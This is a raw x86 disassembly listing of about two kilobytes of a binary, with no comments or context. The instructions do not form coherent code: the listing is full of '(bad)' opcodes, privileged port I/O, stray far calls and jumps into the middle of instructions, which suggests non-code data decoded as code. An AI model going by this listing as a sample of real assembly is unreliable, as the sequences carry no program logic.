  4167e6:	inc    edi
  4167e7:	scas   eax,DWORD PTR es:[edi]
  4167e8:	lock mov ds:0xb8ae64df,al
  4167ee:	or     eax,0xca016c88
  4167f3:	test   al,0x4
  4167f5:	xor    edi,edx
  4167f7:	or     eax,DWORD PTR [ecx+0x3e2f089]
  4167fd:	inc    ebp
  4167fe:	sbb    DWORD PTR [esi+0x64],ebx
  416801:	mov    edi,0x53d71d4b
  416806:	dec    eax
  416807:	call   0x9c47bca0
  41680c:	loopne 0x41682a
  41680e:	in     eax,dx
  41680f:	jne    0x4167e0
  416811:	pop    ebx
  416812:	adc    BYTE PTR [edx],0x7c
  416815:	mov    ah,0xda
  416817:	xchg   edx,eax
  416818:	fcom   DWORD PTR [edi-0xcf8b648]
  41681e:	pop    ebx
  41681f:	push   ebp
  416820:	jmp    0x416854
  416822:	call   0xe5d7:0x4d4ca23b
  416829:	jb     0x4167d3
  41682b:	xchg   ebp,eax
  41682c:	mov    cl,0xed
  41682e:	xor    eax,0xc332427
  416833:	push   DWORD PTR [eax]
  416835:	(bad)  
  416836:	stos   DWORD PTR es:[edi],eax
  416837:	ret    
  416838:	xchg   ebx,eax
  416839:	daa    
  41683a:	mov    WORD PTR [edx-0x63fb3276],cs
  416840:	mov    bl,0xec
  416842:	into   
  416843:	mov    ecx,0xfe604c67
  416848:	jae    0x41686f
  41684a:	mov    edi,ebx
  41684c:	or     BYTE PTR [ebx+ebx*2+0x664844c5],0x3
  416854:	repnz aas 
  416856:	ins    DWORD PTR es:[edi],dx
  416857:	mov    eax,ds:0x16a0e261
  41685c:	mov    ch,0x6e
  41685e:	(bad)  
  41685f:	icebp  
  416860:	push   edi
  416861:	sbb    bl,BYTE PTR ss:[eax+0x7b]
  416865:	arpl   WORD PTR [edi+0xf],dx
  416868:	mov    bh,ah
  41686a:	adc    ecx,DWORD PTR [esi-0xc]
  41686d:	and    ch,cl
  41686f:	imul   ecx,DWORD PTR [ecx+eax*1-0x4accfaff],0x21
  416877:	sub    al,0x9f
  416879:	jb     0x416843
  41687b:	ins    DWORD PTR es:[edi],dx
  41687c:	lock xor ah,BYTE PTR [esi-0x7a]
  416880:	hlt    
  416881:	add    BYTE PTR [eax],bl
  416883:	push   ss
  416884:	lahf   
  416885:	pushf  
  416886:	mov    ecx,0x2f02e6ba
  41688b:	sbb    al,BYTE PTR [edi+eax*1+0x5933957b]
  416892:	xchg   ebp,eax
  416893:	xchg   ecx,eax
  416894:	or     eax,DWORD PTR [eax+0x47]
  416897:	add    ebx,DWORD PTR [edi+0x2b]
  41689a:	es das 
  41689c:	retf   0x176e
  41689f:	pop    ebp
  4168a0:	pop    ds
  4168a1:	adc    DWORD PTR [ebx-0x79edb00a],0xffffff93
  4168a8:	inc    eax
  4168a9:	outs   dx,DWORD PTR ds:[esi]
  4168aa:	out    0x64,al
  4168ac:	add    al,0xe1
  4168ae:	adc    bl,dh
  4168b0:	add    cl,dh
  4168b2:	in     al,dx
  4168b3:	push   edi
  4168b4:	add    DWORD PTR [ecx+ebx*8],ebp
  4168b7:	mov    edi,0x28a548d2
  4168bc:	out    0xc8,al
  4168be:	xchg   ecx,eax
  4168bf:	lea    ebx,[ebp-0x55]
  4168c2:	xchg   edi,eax
  4168c3:	xor    BYTE PTR [ecx],bh
  4168c5:	pop    ds
  4168c6:	pop    edx
  4168c7:	push   edi
  4168c8:	xchg   edi,eax
  4168c9:	lea    eax,[ecx+eax*1-0x35]
  4168cd:	ret    
  4168ce:	push   edi
  4168cf:	jge    0x416867
  4168d1:	enter  0xefe5,0xa5
  4168d5:	jbe    0x4168e4
  4168d7:	dec    edx
  4168d8:	mov    esi,DWORD PTR [bx+si]
  4168db:	push   es
  4168dc:	out    dx,eax
  4168dd:	(bad)  
  4168de:	out    dx,al
  4168df:	push   esp
  4168e0:	cli    
  4168e1:	mov    WORD PTR [esi+0x2a502d70],cs
  4168e7:	hlt    
  4168e8:	into   
  4168e9:	pop    es
  4168ea:	pop    edi
  4168eb:	push   esp
  4168ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ed:	sbb    esi,eax
  4168ef:	imul   edi,DWORD PTR [ebp+0x7b],0xffffff8e
  4168f3:	or     ah,ch
  4168f5:	out    0xb4,eax
  4168f7:	sar    BYTE PTR [esi+eiz*8-0x8a19fb7],cl
  4168fe:	pop    ecx
  4168ff:	mov    ecx,0xf28ee872
  416904:	mov    al,0x13
  416906:	xchg   ebp,eax
  416907:	fadd   st(5),st
  416909:	pop    edi
  41690a:	outs   dx,DWORD PTR ds:[esi]
  41690b:	ins    DWORD PTR es:[edi],dx
  41690c:	aam    0xb2
  41690e:	lock jae 0x4168df
  416911:	jns    0x416953
  416913:	or     esi,DWORD PTR [esi-0x56]
  416916:	out    0x8,al
  416918:	inc    edx
  416919:	fisttp QWORD PTR ds:0xee712153
  41691f:	ja     0x416978
  416921:	jmp    0x416923
  416923:	add    eax,0x2039b1b5
  416928:	inc    ebp
  416929:	xchg   esi,eax
  41692a:	add    eax,0x9f89a577
  41692f:	cmovne ebx,DWORD PTR [eax+eiz*4]
  416933:	call   0x7f76:0x993e2b54
  41693a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693b:	loopne 0x41692d
  41693d:	mov    esp,0xa4347e0d
  416942:	xor    BYTE PTR [esi+0x6235d627],0x19
  416949:	mov    edx,0x9a1a2e9b
  41694e:	loop   0x41695c
  416950:	jae    0x4169c1
  416952:	pop    ds
  416953:	out    0xb8,eax
  416955:	xor    BYTE PTR [edx+0x47],al
  416958:	clc    
  416959:	push   ss
  41695a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41695b:	cld    
  41695c:	mov    esp,0x548eba1b
  416961:	out    0xcc,eax
  416963:	inc    ebp
  416964:	popf   
  416965:	imul   DWORD PTR [ebx]
  416967:	test   DWORD PTR [edx],0x812a3185
  41696d:	scas   eax,DWORD PTR es:[edi]
  41696e:	mov    ah,0xb7
  416970:	bnd js 0x416945
  416973:	test   al,0x83
  416975:	out    dx,eax
  416976:	push   ebp
  416977:	popa   
  416978:	je     0x41698e
  41697a:	xlat   BYTE PTR ds:[ebx]
  41697b:	sbb    ebp,DWORD PTR ds:0x87421fd0
  416981:	retf   
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	push   esi
  416994:	xor    BYTE PTR [esi+0x7f1fa512],dl
  41699a:	jo     0x416955
  41699c:	jle    0x416a0e
  41699e:	jo     0x4169bc
  4169a0:	and    eax,0x9e0ecb36
  4169a5:	ror    DWORD PTR [edi+0x4acd28e0],cl
  4169ab:	cdq    
  4169ac:	mov    ds:0x29df1361,eax
  4169b1:	popa   
  4169b2:	les    esi,FWORD PTR [esi-0xc552f5d]
  4169b8:	mov    edi,0x5a257887
  4169bd:	mov    ch,0x9
  4169bf:	cmp    eax,0xb1aa7bfd
  4169c4:	xor    al,0x44
  4169c6:	or     al,0x43
  4169c8:	jne    0x4169d5
  4169ca:	aad    0xb
  4169cc:	jge    0x4169b9
  4169ce:	ret    0x9ed5
  4169d1:	and    eax,0xc6f0cf47
  4169d6:	fistp  WORD PTR [edx]
  4169d8:	push   eax
  4169d9:	mov    bl,BYTE PTR [edi-0x20]
  4169dc:	leave  
  4169dd:	xor    eax,0x886a0b6f
  4169e2:	push   esp
  4169e3:	cmp    DWORD PTR [esi+0x73],0xffffff8d
  4169e7:	inc    ecx
  4169e8:	ja     0x4169b2
  4169ea:	and    DWORD PTR [ecx+0x49],ecx
  4169ed:	jno    0x41697d
  4169ef:	aam    0xab
  4169f1:	mul    DWORD PTR [edx]
  4169f3:	mov    ds:0x3ab83a02,al
  4169f8:	and    eax,0xd009a5b9
  4169fd:	dec    ebp
  4169fe:	dec    edx
  4169ff:	xchg   edi,eax
  416a00:	stos   DWORD PTR es:[edi],eax
  416a01:	mov    esi,0xe8d45265
  416a06:	int3   
  416a07:	pushf  
  416a08:	adc    dl,BYTE PTR [ebp-0x4c3f6d39]
  416a0e:	test   DWORD PTR [edx+0x465a635d],eax
  416a14:	sbb    ah,BYTE PTR [edx+ecx*4-0x6f]
  416a18:	dec    ecx
  416a19:	in     eax,dx
  416a1a:	mov    ch,0x7f
  416a1c:	aad    0xae
  416a1e:	into   
  416a1f:	push   esi
  416a20:	push   edi
  416a21:	popa   
  416a22:	jge    0x4169cb
  416a24:	xlat   BYTE PTR ds:[ebx]
  416a25:	add    edx,edi
  416a27:	xchg   BYTE PTR [ecx+0x5c],ch
  416a2a:	call   0x144c9416
  416a2f:	test   DWORD PTR [ebx*4-0x1f020956],0x28848c4c
  416a3a:	mov    dh,0x1f
  416a3c:	aas    
  416a3d:	fwait
  416a3e:	lea    ecx,[edx+ebx*4]
  416a41:	xlat   BYTE PTR ds:[ebx]
  416a42:	sti    
  416a43:	arpl   WORD PTR [edx-0x36d612cd],cx
  416a49:	xchg   edi,eax
  416a4a:	jle    0x4169f4
  416a4c:	dec    esi
  416a4d:	push   ebx
  416a4e:	sub    bh,ah
  416a50:	mov    ebp,0x701c4c39
  416a55:	cs sbb eax,0x8c1ecacf
  416a5b:	jmp    0x62e9dcb9
  416a60:	(bad)  
  416a62:	fidivr DWORD PTR [eax]
  416a64:	mov    ch,0x24
  416a66:	aam    0xd
  416a68:	in     eax,dx
  416a69:	ins    BYTE PTR es:[edi],dx
  416a6a:	enter  0x984,0x1a
  416a6e:	xor    al,bh
  416a70:	ins    BYTE PTR es:[edi],dx
  416a71:	cmp    edi,DWORD PTR [edx-0x5ab8fa45]
  416a77:	sub    edx,DWORD PTR [ebp+0x4e]
  416a7a:	(bad)  
  416a7b:	jecxz  0x416a90
  416a7d:	mov    edx,DWORD PTR [eax]
  416a7f:	fs xor al,0x77
  416a82:	mov    ch,0x36
  416a84:	jmp    0x416a3a
  416a86:	retf   0x9025
  416a89:	cwde   
  416a8a:	push   eax
  416a8b:	jns    0x416a61
  416a8d:	mov    esi,0x2e063b9c
  416a92:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416a94:	call   0x4cfb:0xd7e7dd2
  416a9b:	js     0x416a9d
  416a9d:	lods   al,BYTE PTR ds:[esi]
  416a9e:	jp     0x416afe
  416aa0:	in     eax,dx
  416aa1:	xchg   esi,eax
  416aa2:	rcr    BYTE PTR [ebx],cl
  416aa4:	and    ebx,DWORD PTR [esi+0x26845715]
  416aaa:	cmc    
  416aab:	test   BYTE PTR [esi],bl
  416aad:	push   edi
  416aae:	jle    0x416acf
  416ab0:	aas    
  416ab1:	js     0x416a71
  416ab3:	push   ds
  416ab4:	push   ebp
  416ab5:	loopne 0x416b1d
  416ab7:	sub    al,0x60
  416ab9:	jmp    0x416af8
  416abb:	pop    esi
  416abc:	and    esp,DWORD PTR [ebx+0x40]
  416abf:	push   ebx
  416ac0:	leave  
  416ac1:	inc    ecx
  416ac2:	into   
  416ac3:	and    al,0xb9
  416ac5:	pop    ds
  416ac6:	out    dx,eax
  416ac7:	pop    ebx
  416ac8:	popa   
  416ac9:	jge    0x416ab3
  416acb:	dec    esp
  416acc:	into   
  416acd:	sub    BYTE PTR [edi-0xfd237ba],ch
  416ad3:	or     esp,DWORD PTR [edx-0x7]
  416ad6:	sub    ch,bh
  416ad8:	into   
  416ad9:	cdq    
  416ada:	shl    DWORD PTR ds:0xd48280f,0x3f
  416ae1:	(bad)  
  416ae2:	dec    ebx
  416ae3:	and    dl,ah
  416ae5:	dec    ebx
  416ae6:	jno    0x416b63
  416ae8:	fcomp  QWORD PTR [edx+esi*1-0x51f6fe6d]
  416aef:	repnz and BYTE PTR [edx-0xc6cbccd],bh
  416af6:	jb     0x416aa0
  416af8:	leave  
  416af9:	jg     0x416a7d
  416afb:	xchg   esp,eax
  416afc:	jbe    0x416b19
  416afe:	and    esp,DWORD PTR [ebp+0x1e]
  416b01:	div    BYTE PTR [eax+edi*1+0x5c6c41ff]
  416b08:	lods   eax,DWORD PTR ds:[esi]
  416b09:	xchg   esi,eax
  416b0a:	aaa    
  416b0b:	cmc    
  416b0c:	cmp    dl,BYTE PTR [ecx+edi*4-0x5c]
  416b10:	ret    
  416b11:	dec    ebx
  416b12:	mov    dl,BYTE PTR [edi]
  416b14:	sbb    eax,0x9bc37970
  416b19:	xchg   BYTE PTR [eax],al
  416b1b:	cld    
  416b1c:	addr16 jl 0x416ada
  416b1f:	sub    DWORD PTR [ebp-0x3fa6b100],0x2f
  416b26:	add    al,0x99
  416b28:	aaa    
  416b29:	mov    esp,0x8897787
  416b2e:	xor    DWORD PTR [ebx-0x952f171],eax
  416b34:	sbb    DWORD PTR [esi-0xb2ff70e],eax
  416b3a:	push   ebx
  416b3b:	imul   edi,DWORD PTR [edi+0x3e3f6416],0xffffffc6
  416b42:	ins    DWORD PTR es:[edi],dx
  416b43:	stc    
  416b44:	das    
  416b45:	mov    ecx,0xef2d807a
  416b4a:	test   BYTE PTR [ebx-0x8],0x59
  416b4e:	cmp    edi,DWORD PTR [ecx+edx*4-0x7c3a8740]
  416b55:	or     eax,ebp
  416b57:	inc    eax
  416b58:	adc    al,0x63
  416b5a:	sub    BYTE PTR [esi+0x2f],dh
  416b5d:	rol    BYTE PTR [ebp-0x9],cl
  416b60:	ss or  ebx,edi
  416b63:	push   ebp
  416b64:	jmp    0x416b39
  416b66:	daa    
  416b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b68:	js     0x416ba0
  416b6a:	mov    ds:0xbe82333b,al
  416b6f:	cli    
  416b70:	sub    al,0xf3
  416b72:	sub    ebp,DWORD PTR [ebx+0x21]
  416b75:	xor    dh,ch
  416b77:	inc    eax
  416b78:	cmp    al,0x61
  416b7a:	movhps QWORD PTR [edx+0x17679881],xmm2
  416b81:	shr    DWORD PTR [esp+ecx*2-0x2d],0xd4
  416b86:	xchg   edx,eax
  416b87:	and    al,0xac
  416b89:	nop
  416b8a:	(bad)
  416b8d:	fcmove st,st(5)
  416b8f:	xlat   BYTE PTR ds:[ebx]
  416b90:	mov    ?,WORD PTR [ebx+eiz*1+0xc]
  416b94:	ins    DWORD PTR es:[edi],dx
  416b95:	add    dh,ah
  416b97:	push   es
  416b98:	ja     0x416c15
  416b9a:	fmul   DWORD PTR [esi-0x5af7ef2d]
  416ba0:	ins    DWORD PTR es:[edi],dx
  416ba1:	das    
  416ba2:	xchg   edi,eax
  416ba3:	mov    eax,ds:0x6015a546
  416ba8:	mov    BYTE PTR [edx],dh
  416baa:	lea    esi,[ebx+eax*2-0x28]
  416bae:	mov    ah,BYTE PTR [ebx-0x3]
  416bb1:	and    al,0xe0
  416bb3:	jb     0x416bfc
  416bb5:	adc    ah,BYTE PTR [ebx+0x4b3869d7]
  416bbb:	inc    ebp
  416bbc:	(bad)  [ebp+0x4]
  416bbf:	mov    dl,0xf
  416bc1:	fwait
  416bc2:	ins    BYTE PTR es:[edi],dx
  416bc3:	xchg   esi,eax
  416bc4:	and    DWORD PTR [ebx],edi
  416bc6:	sti    
  416bc7:	adc    al,BYTE PTR [ecx+0x18]
  416bca:	(bad)  
  416bcb:	add    BYTE PTR [edx],dh
  416bcd:	add    eax,0x49341b08
  416bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd3:	inc    ecx
  416bd4:	sbb    ah,BYTE PTR [ebp-0x427f9c8b]
  416bda:	(bad)  [ecx+0x8]
  416bdd:	pop    edx
  416bde:	mov    ebp,0x306affac
  416be3:	or     DWORD PTR [eax+0x7d820dc2],0xffffff82
  416bea:	inc    ecx
  416beb:	mov    al,ds:0xc5a4fe9c
  416bf0:	popa   
  416bf1:	cmc    
  416bf2:	scas   al,BYTE PTR es:[edi]
  416bf3:	dec    eax
  416bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf5:	jmp    0x416c0f
  416bf7:	jl     0x416c71
  416bf9:	mov    eax,gs:0xbd53c97f
  416bff:	fiadd  DWORD PTR [ebx+0x3b]
  416c02:	sahf   
  416c03:	cmp    DWORD PTR [ecx],0x5b
  416c06:	sbb    BYTE PTR [ebp-0x790227a0],0xcd
  416c0d:	and    eax,0x805823ba
  416c12:	sub    bh,BYTE PTR [ecx+0x5a]
  416c15:	xchg   esp,eax
  416c16:	jnp    0x416c62
  416c18:	mov    DWORD PTR [eax-0xa1fe8e1],eax
  416c1e:	jge    0x416c83
  416c20:	(bad)  
  416c21:	pop    esp
  416c22:	dec    esp
  416c23:	lahf   
  416c24:	std    
  416c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c26:	xchg   BYTE PTR [esi+ecx*4],bl
  416c29:	ja     0x416c57
  416c2b:	dec    ebx
  416c2d:	jle    0x416c99
  416c2f:	mov    dh,0x69
  416c31:	adc    DWORD PTR [ecx],0x5a0c9884
  416c37:	cld    
  416c38:	jnp    0x416c8a
  416c3a:	mov    esi,ds
  416c3c:	jmp    0xc239:0x105d6204
  416c43:	pop    ebp
  416c44:	out    dx,al
  416c45:	inc    ebp
  416c46:	sbb    esp,DWORD PTR [eax]
  416c48:	lds    esp,FWORD PTR [ebx+0x91cbe42]
  416c4e:	xchg   ebp,eax
  416c4f:	or     DWORD PTR [ebp+0x174d6763],ecx
  416c55:	inc    ecx
  416c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c57:	icebp  
  416c58:	and    eax,0x156ed0dd
  416c5d:	mov    ah,0xda
  416c5f:	ins    DWORD PTR es:[edi],dx
  416c60:	in     al,0xea
  416c62:	call   0x458b:0x491dd899
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	lods   al,BYTE PTR gs:[esi]
  416c7d:	sbb    ebp,edi
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c4c
  416c88:	stos   DWORD PTR es:[edi],eax
  416c89:	inc    edx
  416c8a:	pop    ebx
  416c8b:	cmp    DWORD PTR [edi+0x7e],eax
  416c8e:	mov    WORD PTR [ecx+0x6f],cs
  416c91:	and    eax,ebx
  416c93:	scas   al,BYTE PTR es:[edi]
  416c94:	adc    esp,DWORD PTR [ecx+0x60a2b3a3]
  416c9a:	push   eax
  416c9b:	dec    ecx
  416c9c:	xor    al,0xeb
  416c9e:	jns    0x416d1c
  416ca0:	add    DWORD PTR [ecx+0x6a],edx
  416ca3:	arpl   WORD PTR [edi-0x50a0966d],bx
  416ca9:	out    dx,al
  416caa:	xchg   edi,eax
  416cab:	lahf   
  416cac:	les    ebp,FWORD PTR [edi]
  416cae:	xchg   esp,ebx
  416cb0:	sahf   
  416cb1:	push   0x28
  416cb3:	aam    0x3a
  416cb5:	outs   dx,BYTE PTR ds:[esi]
  416cb6:	or     BYTE PTR [ebp-0x6a],bh
  416cb9:	mov    ah,0xab
  416cbb:	leave  
  416cbc:	cli    
  416cbd:	and    eax,0x8a8e8241
  416cc2:	xchg   edx,eax
  416cc3:	and    eax,0x9f2ba503
  416cc8:	mov    ch,bh
  416cca:	adc    dl,BYTE PTR [eax-0xf]
  416ccd:	jbe    0x416d37
  416ccf:	retf   0x5a04
  416cd2:	adc    BYTE PTR [edx+0x31],0xe9
  416cd6:	cmp    ebx,DWORD PTR [edx]
  416cd8:	pop    es
  416cd9:	sub    ebx,DWORD PTR [edx+0x3a]
  416cdc:	gs dec eax
  416cde:	mov    ch,0xb6
  416ce0:	das    
  416ce1:	in     eax,0x50
  416ce3:	xchg   edi,eax
  416ce4:	fs pop eax
  416ce6:	fwait
  416ce7:	jmp    0x416c8f
  416ce9:	ss retf 0x1dde
  416ced:	rcl    BYTE PTR [esi-0x20],0xdc
  416cf1:	adc    al,0x48
  416cf3:	or     ebx,DWORD PTR [ebx-0x42c59f9b]
  416cf9:	out    dx,eax
  416cfa:	dec    ebp
  416cfb:	icebp  
  416cfc:	xchg   edx,eax
  416cfd:	adc    eax,0xc35b5dba
  416d02:	push   ebp
  416d03:	js     0x416cf0
  416d05:	ret    
  416d06:	sub    esi,ebx
  416d08:	ds pop esp
  416d0a:	fld    QWORD PTR [ebx+0x293f7987]
  416d10:	add    ecx,esp
  416d12:	ds pop es
  416d14:	add    BYTE PTR [eax-0x60e94220],dl
  416d1a:	pop    edi
  416d1b:	sub    BYTE PTR [edi-0x39],ch
  416d1e:	jbe    0x416d27
  416d20:	push   edi
  416d21:	std    
  416d22:	jge    0x416d25
  416d24:	xchg   ecx,eax
  416d25:	in     al,0x6a
  416d27:	stos   BYTE PTR es:[edi],al
  416d28:	cmp    DWORD PTR [ecx+0x5f],esi
  416d2b:	mov    eax,ds:0x234dd297
  416d30:	inc    ebx
  416d31:	test   al,0xa0
  416d33:	xor    DWORD PTR [esi+0x503bfaa4],esp
  416d39:	ds jecxz 0x416cfc
  416d3c:	or     dl,BYTE PTR [ecx]
  416d3e:	mov    edx,0x80f1b580
  416d43:	mov    dh,0xde
  416d45:	into   
  416d46:	jl     0x416ce0
  416d48:	pop    esi
  416d49:	jne    0x416d5d
  416d4b:	push   ebx
  416d4c:	hlt    
  416d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d4e:	add    BYTE PTR [ebp+0x3a4834c8],cl
  416d54:	fldz   
  416d56:	test   eax,0xe878fd64
  416d5b:	mov    al,ds:0xcd6f58b1
  416d60:	ds pusha 
  416d62:	out    0x4f,eax
  416d64:	inc    ebp
  416d65:	push   ss
  416d66:	aad    0xc2
  416d68:	xchg   ebx,eax
  416d69:	add    ecx,DWORD PTR [edi+eiz*2]
  416d6c:	daa    
  416d6d:	cmp    esp,DWORD PTR [esi+edx*2-0x57]
  416d71:	rcr    BYTE PTR [ebp-0x5f642b57],cl
  416d77:	xlat   BYTE PTR ds:[ebx]
  416d78:	mov    ah,ah
  416d7a:	inc    ebp
  416d7b:	cli    
  416d7c:	dec    ebp
  416d7d:	mov    ds:0x9fcd5732,eax
  416d82:	mov    ah,0xb5
  416d84:	fisttp WORD PTR [edx]
  416d86:	lods   al,BYTE PTR ds:[esi]
  416d87:	out    0x8f,al
  416d89:	bound  ecx,QWORD PTR ds:0x7f546e96
  416d8f:	and    al,0x2e
  416d91:	popf   
  416d92:	pop    ss
  416d93:	dec    esi
  416d94:	out    dx,eax
  416d95:	mov    dh,0xc1
  416d97:	jg     0x416df7
  416d99:	test   al,0x71
  416d9b:	scas   al,BYTE PTR es:[edi]
  416d9c:	sub    DWORD PTR [esi+0x364c6aeb],0x52819a18
  416da6:	out    dx,eax
  416da7:	lods   al,BYTE PTR ds:[esi]
  416da8:	sti    
  416da9:	sbb    DWORD PTR [ebp-0x1c],edi
  416dac:	call   0x15c0:0xdaa4c5a
  416db3:	xchg   ebx,eax
  416db4:	pop    eax
  416db5:	mov    DWORD PTR [esi-0x6dbd6a0d],edx
  416dbb:	pop    esp
  416dbc:	les    ebp,FWORD PTR [ecx+0x20aec85d]
  416dc2:	mov    esp,0x9c7619fc
  416dc7:	xor    al,0x97
  416dc9:	ret    0x64bb
  416dcc:	push   esp
  416dcd:	fwait
  416dce:	repnz sub DWORD PTR [ebx],esp
  416dd1:	mov    bl,0x33
  416dd3:	test   DWORD PTR [ebx-0x4],eax
  416dd6:	pop    ebp
  416dd7:	push   edi
  416dd8:	fwait
  416dd9:	mov    dh,0xce
  416ddb:	xor    ebp,DWORD PTR [ebx-0xc]
  416dde:	push   dx
  416de0:	inc    eax
  416de1:	lods   eax,DWORD PTR ds:[esi]
  416de2:	mov    BYTE PTR [ecx-0x3f],ch
  416de5:	fs pop esp
  416de7:	int    0xd6
  416de9:	in     eax,dx
  416dea:	mov    al,0xbe
  416dec:	or     al,0x71
  416dee:	push   0xfffffffa
  416df0:	fist   DWORD PTR [eax+ecx*8]
  416df3:	xchg   ecx,eax
  416df4:	and    DWORD PTR [esi-0x39],ebp
  416df7:	adc    DWORD PTR [ebx+0x14],ecx
  416dfa:	push   ebx
  416dfb:	fs mov ebx,0xb95fe607
  416e01:	repz or eax,0xdc491592
  416e07:	hlt    
  416e08:	add    DWORD PTR [ebx+0x2a],ebx
  416e0b:	loope  0x416da6
  416e0d:	rcl    DWORD PTR [ebp+ebp*1+0x75c06aeb],0xd2
  416e15:	outs   dx,DWORD PTR ds:[esi]
  416e16:	and    al,0xb5
  416e18:	cmp    BYTE PTR [edi],bl
  416e1a:	mov    eax,0x62d02b90
  416e1f:	test   eax,0x48a6d4fb
  416e24:	lea    esi,[ebp+ebp*8-0x7e55c846]
  416e2b:	inc    eax
  416e2c:	and    BYTE PTR [edx],ch
  416e2e:	adc    DWORD PTR [eax+0xf99dfb0],edx
  416e34:	sbb    al,0xf7
  416e36:	dec    esi
  416e37:	stos   BYTE PTR es:[edi],al
  416e38:	jmp    0xc54acf06
  416e3d:	push   ecx
  416e3e:	into   
  416e3f:	mov    cl,0x11
  416e41:	and    eax,0xeea63e2
  416e46:	xor    di,di
  416e49:	mov    al,0x79
  416e4b:	pop    eax
  416e4c:	adc    DWORD PTR [ecx],ebx
  416e4e:	data16 ins BYTE PTR es:[edi],dx
  416e50:	stc    
  416e51:	outs   dx,DWORD PTR ds:[esi]
  416e52:	std    
  416e53:	push   eax
  416e54:	dec    ch
  416e56:	mov    al,0xf5
  416e58:	mov    ah,0x6c
  416e5a:	fsubp  st(3),st
  416e5c:	test   DWORD PTR [esi-0x3b],0xc39a4c5d
  416e63:	jae    0x416ee1
  416e65:	mov    ds:0xa326659,al
  416e6a:	outs   dx,BYTE PTR ds:[esi]
  416e6b:	xchg   DWORD PTR [ecx-0x62],eax
  416e6e:	or     edi,DWORD PTR [ecx]
  416e70:	cbw    
  416e72:	ret    0xdfe7
  416e75:	out    0xb6,al
  416e77:	outs   dx,BYTE PTR ds:[esi]
  416e78:	nop
  416e79:	xchg   ebx,eax
  416e7a:	push   ebx
  416e7b:	jmp    0x416efa
  416e7d:	jae    0x416ead
  416e7f:	(bad)  
  416e80:	je     0x416e6d
  416e82:	sub    DWORD PTR [esi-0x2d],0x4339c095
  416e89:	push   ebx
  416e8a:	dec    ebx
  416e8b:	arpl   WORD PTR [ebx+0x1cf69cf8],cx
  416e91:	dec    ecx
  416e92:	stc    
  416e93:	and    BYTE PTR [ecx+0x64d0d028],bl
  416e99:	int    0xb8
  416e9b:	and    DWORD PTR [edi-0x2a5b58f1],esi
  416ea1:	xor    DWORD PTR [ebx-0xaf28a08],ebx
  416ea7:	sbb    DWORD PTR [ebx+edi*8],esp
  416eaa:	(bad)  
  416eab:	sub    DWORD PTR [eax-0x13ac84dc],esi
  416eb1:	mov    BYTE PTR [edi+eiz*2+0x52],dh
  416eb5:	pop    DWORD PTR [edi]
  416eb7:	(bad)
  416ebc:	mov    ?,WORD PTR [edx+ebp*2-0x70]
  416ec0:	sbb    cl,BYTE PTR [eax+0x28]
  416ec3:	add    BYTE PTR [eax+eiz*2],0xd4
  416ec7:	xor    BYTE PTR [ecx+0x3725a651],0x50
  416ece:	cs jge 0x416e56
  416ed1:	xor    DWORD PTR [ecx+0x4c842f78],0x5d
  416ed8:	outs   dx,BYTE PTR ds:[esi]
  416ed9:	loope  0x416f29
  416edb:	les    edx,FWORD PTR [eax]
  416edd:	inc    ebx
  416ede:	lahf   
  416edf:	pop    esi
  416ee0:	lods   al,BYTE PTR ds:[esi]
  416ee1:	test   bl,bl
  416ee3:	adc    eax,DWORD PTR [ebx+ebx*8+0x3c]
  416ee7:	xchg   BYTE PTR [esi-0x7eb73cca],bl
  416eed:	aad    0xe2
  416eef:	sub    eax,esi
  416ef1:	or     DWORD PTR cs:0xdb4278d6,eax
  416ef8:	cmp    BYTE PTR [eax-0x488d1b27],dl
  416efe:	pusha  
  416eff:	mov    fs,WORD PTR [ecx-0x55]
  416f02:	inc    edi
  416f03:	jne    0x416f27
  416f05:	pop    ebx
  416f06:	mov    edx,cs
  416f08:	test   BYTE PTR [ecx+ecx*2],dl
  416f0b:	and    BYTE PTR [eax-0x1278d09b],cl
  416f11:	add    dl,BYTE PTR ds:0x7ac2de05
  416f17:	mov    bh,0x2a
  416f19:	add    esp,eax
  416f1b:	sub    edx,DWORD PTR [ebx]
  416f1d:	cmp    al,BYTE PTR [ebx]
  416f1f:	stos   DWORD PTR es:[edi],eax
  416f20:	push   ss
  416f21:	push   esp
  416f22:	es or  eax,0x62e1a840
  416f28:	or     ch,bh
  416f2a:	lea    ebp,[eax]
  416f2c:	cmp    cl,0xc1
  416f2f:	sub    al,0x88
  416f31:	add    eax,0xf1c06971
  416f36:	stos   BYTE PTR es:[edi],al
  416f37:	push   edi
  416f38:	lods   al,BYTE PTR ds:[esi]
  416f39:	aad    0x56
  416f3b:	mov    DWORD PTR [esp],ecx
  416f3e:	rcl    dl,1
  416f40:	mov    ds:0xb187e983,al
  416f45:	fst    QWORD PTR [edi]
  416f47:	mov    al,ds:0x88eb6382
  416f4c:	add    dh,ch
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	aam    0x3b
  416f6c:	sub    cl,BYTE PTR [ecx+0x707f1937]
